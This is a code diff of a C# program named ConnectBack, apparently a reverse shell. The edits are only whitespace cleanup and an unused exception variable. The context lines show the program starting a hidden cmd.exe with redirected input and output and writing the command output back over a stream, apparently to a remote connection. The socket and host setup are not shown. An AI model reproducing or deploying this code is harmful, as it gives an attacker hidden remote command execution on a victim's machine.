@@ -1,21 +1,11 @@
 using System;
-
 using System.Text;
-
 using System.IO;
-
 using System.Diagnostics;
-
 using System.ComponentModel;
-
 using System.Linq;
-
 using System.Net;
-
 using System.Net.Sockets;
-
-
-
 
 
 namespace ConnectBack
@@ -27,7 +17,6 @@ namespace ConnectBack
 	{
 
 		static StreamWriter streamWriter;
-
 
 
 		public static void Main(string[] args)
@@ -52,28 +41,19 @@ namespace ConnectBack
 
 						StringBuilder strInput = new StringBuilder();
 
-
-
 						Process p = new Process();
 
 						p.StartInfo.FileName = "cmd.exe";
-
 						p.StartInfo.CreateNoWindow = true;
-
 						p.StartInfo.UseShellExecute = false;
-
 						p.StartInfo.RedirectStandardOutput = true;
-
 						p.StartInfo.RedirectStandardInput = true;
-
 						p.StartInfo.RedirectStandardError = true;
-
 						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
 
 						p.Start();
 
 						p.BeginOutputReadLine();
-
 
 
 						while(true)
@@ -117,19 +97,16 @@ namespace ConnectBack
                 {
 
                     strOutput.Append(outLine.Data);
-
                     streamWriter.WriteLine(strOutput);
-
                     streamWriter.Flush();
 
                 }
 
-                catch (Exception err) { }
+                catch (Exception) { }
 
             }
 
         }
-
 
 
 	}
